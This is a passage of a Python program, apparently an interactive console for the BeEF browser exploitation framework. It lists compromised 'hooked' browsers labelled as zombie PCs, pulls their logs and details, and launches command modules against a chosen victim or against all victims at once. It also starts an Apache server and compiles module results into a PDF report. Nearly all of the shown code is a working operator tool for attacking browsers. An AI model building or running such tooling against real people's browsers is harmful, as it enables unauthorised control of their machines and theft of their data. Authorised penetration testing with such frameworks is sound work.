        while True:
            choice = input('[?] Enter Your Choice : ')
            if int(choice) not in range(1, 14): print('[-] Invalid Selection, Select Valid Choice')
            else:
                print('\n')
                return choice

    def main(self):
        try:
            while True:
                choice = self.user_choice()
                print(f'Your Choice : {choice}')
                if choice == '1':
                    sessions = self.get_hooked_browsers(enable_print=False)
                    total_list = []
                    for k, v in sessions.items(): total_list.append([k, v])
                    print(f"{tabulate(total_list, headers=['Zombie PC', 'Session ID'], tablefmt='orgtbl')}\n")

                elif choice == '2':
                    print('\t[a] Initial Details\n\t[b] Brief Details')
                    while True:
                        usr_chc = input('\t[?] Enter Your Choice : ')
                        if usr_chc not in ['a', 'b']:
                            print('\t[-] Invalid Selection, Selection Valid Choice')
                        else:
                            if usr_chc == 'a':
                                print('\n')
                                self.get_hooked_browsers(enable_print=True)
                                print('\n')
                                break
                            elif usr_chc == 'b':
                                sessions = self.get_hooked_browsers(enable_print=False)
                                self.get_hooked_browsers_details(sessions)
                                break

                elif choice == '3':
                    print('\t[a] Initial Details\n\t[b] Brief Details')
                    while True:
                        usr_chc = input('\t[?] Enter Your Choice : ')
                        if usr_chc not in ['a', 'b']:
                            print('\t[-] Invalid Selection, Selection Valid Choice')
                        else:
                            if usr_chc == 'a':
                                print('\n')
                                self.get_hooked_browsers(offline_mode=True, enable_print=True)
                                print('\n')
                                break
                            elif usr_chc == 'b':
                                sessions = self.get_hooked_browsers(offline_mode=True, enable_print=False)
                                self.get_hooked_browsers_details(sessions)
                                break

                elif choice == '4': self.get_logs()

                elif choice == '5':
                    session = self.get_hooked_browsers(enable_print=False)
                    if len(session) > 1:
                        for k, v in session.items(): print('\t{k} == {v}')
                        while True:
                            session_choice = input('[?] Enter the IP of Zombie PC : ')
                            if session_choice in session.keys():
                                self.get_browser_logs(session_id=session[session_choice])
                                break
                            elif session_choice not in session.keys(): print('[-] You Entered Invalid Zombie PC, Enter Valid IP of Zombie PC :(\n')
                    elif len(session) == 1: self.get_browser_logs(session_id=list(session.values())[0])
                    else: print('[-] No Online Browsers Observed, Unable to Get the Logs.....:(\n')

                elif choice == '6': self.get_command_modules()

                elif choice == '7':
                    id_list = self.get_command_modules(enable_print=False)
                    self.specific_command_module_info(module_id=id_list)

                elif choice == '8':
                    id = input('[?] Enter Command Module Id to get Information about it : ')
                    if id.__contains__(', '): self.specific_command_module_info(module_id=id.split(', '))
                    elif id.__contains__(','): self.specific_command_module_info(module_id=id.split(','))
                    elif id.__contains__(' '): self.specific_command_module_info(module_id=id.split(' '))
                    elif id.__contains__('|'): self.specific_command_module_info(module_id=id.split('|'))
                    else: self.specific_command_module_info(module_id=id)

                elif choice == '9':
                    sessions = self.get_hooked_browsers(enable_print=False)
                    module_choice = input('[?] Enter Command Module Id : ')
                    if len(sessions) > 1:
                        for k, v in sessions.items(): print(f'\tZombie PC : {k} | Session : {v}')
                        user_check = input('[?] Enter Zombie PC for Launching Command : ')
                        self.module_info(module_choice, sessions, user_check)
                    elif len(sessions) == 1: self.module_info(module_choice, sessions)
                    else: print('[-] No Sessions Found............:(\n')

                elif choice == '10':
                    sessions = self.get_hooked_browsers(enable_print=False)
                    if len(sessions) > 1:
                        for k, v in sessions.items(): print(f'\tZombie PC : {k} | Session : {v}')
                        user_check = input('[?] Enter Zombie PC for Launching Command : ')
                        for m in self._get_method_modules: self.module_info(m, sessions, user_check)
                    elif len(sessions) == 1:
                        for m in self._get_method_modules: self.module_info(m, sessions)
                    else: print('[-] No Sessions Found............:(\n')

                elif choice == '11':
                    sessions = self.get_hooked_browsers(enable_print=False)
                    if len(sessions) > 1:
                        for k, v in sessions.items(): print(f'\tZombie PC : {k} | Session : {v}')
                        user_check = input('[?] Enter Zombie PC for Launching Command : ')
                        for m in self.get_post_dict().keys():  self.module_info(m, sessions, user_check)
                    elif len(sessions) == 1:
                        for m in self.get_post_dict().keys(): self.module_info(m, sessions)
                    else: print('[-] No Sessions Found............:(\n')

                elif choice == '12':
                    self.report(report_path=input('[?] Provide the Path for Generating Report : '))
                    print('\r[+] Report Generated Successfully')

                elif choice == '13':
                    os.system('service apache2 stop')
                    print('[+] Apache Server Stopped....!')
                    print('[!!] Signing OFF, Bye ! Bye ! :)\n')
                    break

                cont = input('[?] Do You Want to Continue [Y/N] : ')
                if cont in ['Y', 'y']: continue
                elif cont in ['N', 'n']:
                    os.system('service apache2 stop')
                    print('[+] Apache Server Stopped....!')
                    break
        except requests.exceptions.ConnectionError as e: print(f'[-] Connection Error, Run Beef Server | Reason for Error {e}')

    def report(self, report_path):
        pdf = rpt.PDF_Report(filename=report_path)
        elements = []

        # ADD ONLINE BROWSER SESSIONS
        sessions = self.get_hooked_browsers(enable_print=False)
        total_list = []
        total_list.append(['Zombie PC', 'Session ID'])
        if len(sessions) != 0:
            for k, v in sessions.items(): total_list.append([k, v])
        else: total_list.append(['No Info', 'No Info'])
        elements.append(pdf.create_text('<b><i>Report | Online and Offline Hooked Browsers</i></b>', style_type='BodyText', font_size=13, text_color=(0, 139, 139, 2)))
        elements.append(pdf.create_text('<br/>'))
        elements.append(pdf.create_text(text='<i>Online Browser Sessions</i>'))
        elements.append(pdf.create_text('<br/>'))
        elements.append(pdf.create_table(total_list, [1*inch, 6*inch]))

        # ONLINE / OFFLINE BROWSER INITIAL DETAILS
        elements.append(pdf.create_text('<br/>'))
        initial_details_list = []
        initial_details_list.append(['Parameter', 'Information'])
        initial_details = self.get_hooked_browsers(enable_print=False, report=True)
        if len(initial_details) != 0:
            for k, v in initial_details.items(): initial_details_list.append([k, v])
            elements.append(pdf.create_text(text='<i>Online Browser Initial Details: </i>'))
            elements.append(pdf.create_text('<br/>'))
            elements.append(pdf.create_table(initial_details_list, [1.5*inch, 6*inch]))
        elif len(initial_details) == 0:
            initial_details = self.get_hooked_browsers(offline_mode=True, enable_print=False, report=True)
            for k, v in initial_details.items(): initial_details_list.append([k, v])
            elements.append(pdf.create_text(text='[-] No Online Browsers Observed', text_color=(0, 139, 139, 2)))
            elements.append(pdf.create_text(text='<i>Offline Browsers Initial Details: </i>'))
            elements.append(pdf.create_text('<br/>'))
            elements.append(pdf.create_table(initial_details_list, [1.5*inch, 6*inch]))

        # ONLINE / OFFLINE BROWSER COMPLETE DETAILS
        elements.append(pdf.apply_page_break())
        sessions = self.get_hooked_browsers(enable_print=False)
        if self.get_hooked_browsers_details(sessions, report=True) is not None:
            detail_list = self.get_hooked_browsers_details(sessions, report=True)
            detail_list.insert(0, ['Properties', 'Details'])
            elements.append(pdf.create_text('<b><i>Browser Complete Details</i></b>', font_size=12, text_color=(0, 139, 139, 2)))
            elements.append(pdf.create_text('<br/>'))
            elements.append(pdf.create_table(detail_list, [1.6*inch, 6*inch]))
        elif self.get_hooked_browsers_details(sessions, report=True) is None:
            elements.append(pdf.create_text('<i>[-] No Online Browsers Observed</i>'))
            elements.append(pdf.create_text('<b><i>Offline Browsers Information</i></b>', font_size=12, text_color=(0, 139, 139, 2)))
            sessions = self.get_hooked_browsers(offline_mode=True, enable_print=False)
            detail_list = self.get_hooked_browsers_details(sessions, report=True)
            detail_list.insert(0, ['Properties', 'Details'])
            elements.append(pdf.create_text('<br/>'))
            elements.append(pdf.create_table(detail_list, [1.6*inch, 6*inch]))

        # MODULES INFORMATION AND RESPECTIVE RESULTS
        elements.append(pdf.apply_page_break())
        elements.append(pdf.create_text('<b><i>Command Modules Response</i></b>', font_size=12, text_color=(0, 139, 139, 2)))
        sessions = self.get_hooked_browsers(enable_print=False)
        if len(sessions) != 0:
            for k, v in sessions.items():
                elements.append(pdf.create_text('<br/>'))
                elements.append(pdf.create_text(text=f'<b>IPAddress = {k}</b>', font_size=10, text_color=(24, 181, 224, 1)))
                elements.append(pdf.create_text(text=f'Session ID = {v}', font_size=10))
                elements.append(pdf.create_text('<br/>'))
                final_list = []
                final_list.append(['Module Name', 'Module Category', 'DateTime', 'Module Response'])
                for i in range(1, 261):
                    for k, v in sessions.items():
                        rm_info = self.report_module_info(str(i), v)
                        if rm_info is not None: final_list.append(rm_info)
                elements.append(pdf.create_table(final_list))
        elif len(sessions) == 0:
            elements.append(pdf.create_text('<i>[-] No Sessions Found | No Online Hooked Browsers Observed</i>', text_color=(0, 139, 139, 2)))

        pdf.save_pdf(elements)



if __name__ == '__main__':

    Beef_Project.intro()
    print('********** WELCOME TO BEEF CONSOLE **********\n')
    print('[*] Provide BeEF Server Details : ')
    beef_host, beef_port, beef_user, beef_pass = input('[?] Enter BeEF HostName : '), input('[?] Enter BeEF Running Port : '), input('[?] Enter BeEF UserName : '), input('[?] Enter BeEF Password : ')
    print('[*] Provide Apache Server Details: ')
    apache_hostname, apache_port = input('[?] Enter Host Name : '), input('[?] Enter Port Number : ')
    print(f'[+] Apache Server Started.....!')
    os.system('service apache2 start')
    time.sleep(5)
    bf = Beef_Project(hostname=apache_hostname, port=apache_port, beef_hostname=beef_host, beef_port=beef_port, beef_username=beef_user, beef_password=beef_pass)
    bf.main()
